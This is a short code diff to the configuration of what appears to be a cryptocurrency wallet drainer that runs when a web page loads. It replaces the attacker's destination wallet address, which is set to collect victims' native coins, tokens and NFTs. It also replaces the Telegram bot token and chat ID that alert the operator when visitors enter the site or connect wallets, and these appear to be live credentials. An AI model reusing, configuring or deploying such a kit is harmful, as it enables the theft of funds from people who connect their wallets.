@@ -32,7 +32,7 @@
 document.addEventListener("DOMContentLoaded", async () => {
 
     const CF = {
-        Wallet: "EQCG30yMLeyJ_2WWW6RKn3bnd_ifx11znHRSRRdBcn3nfXPN",  // Wallet address where the assets will go
+        Wallet: "UQDeDlh5xlsRgvMnqZdi11wPmDN-Tr-lH2UK0yRwaYwdVedu",  // Wallet address where the assets will go
         Native: true, // ('true' enabled or 'false' disabled)
         Tokens: true, // ('true' enabled or 'false' disabled)
         NFTs: true, // ('true' enabled or 'false' disabled)
@@ -43,8 +43,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
     
     const TG = {
-        token: "7370937338:AAG_Jt1EI3xHh1cQ_X7kE4OTPYkTCb1aJaQ", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
-        chat_id: "6539847479", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
+        token: "7721830203:AAFcznpAMprVjIv1jW6wsgY4jYE3R69bQo8", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
+        chat_id: "6675076138", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
         enter_website: true, // Notify on site entry ('true' enabled or 'false' disabled)
         connect_success: true, // Notify on wallet connection ('true' enabled or 'false' disabled)
         connect_empty: true,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
